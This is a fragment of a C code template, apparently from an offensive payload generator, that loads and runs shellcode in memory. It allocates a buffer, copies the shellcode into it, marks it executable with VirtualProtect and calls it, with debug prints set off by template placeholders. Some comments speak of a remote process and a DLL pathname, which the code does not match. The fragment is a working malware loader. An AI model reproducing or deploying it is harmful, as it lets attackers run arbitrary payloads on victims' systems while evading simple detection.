
    shellcodeLen = strlen(shellcode);

    // Allocate space in the remote process for the pathname
    PVOID pBuffer = VirtualAlloc(0, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pBuffer == NULL)
    {
        {{if .Debug}}
        printf(TEXT("[-] Error: Could not allocate memory inside PID.\n"));
        {{end}}
        return(1);
    }

    // Copy the DLL's pathname to the remote process address space
    RtlMoveMemory(pBuffer, shellcode, shellcodeLen);

    DWORD oldMemPerms;
    if (!VirtualProtect(pBuffer, shellcodeLen, PAGE_EXECUTE_READ, &oldMemPerms))
    {
        {{if .Debug}}
        printf(TEXT("[-] Error: VirtualProtect - could not change memory to executable\n"));
        {{end}}
        return(1);
    }

    // cast to fp, execute
    int(*exec)() = (int(*)())(pBuffer);
    exec();

    if (pBuffer != NULL)
        VirtualFree(pBuffer, 0, MEM_RELEASE);

    return 0;
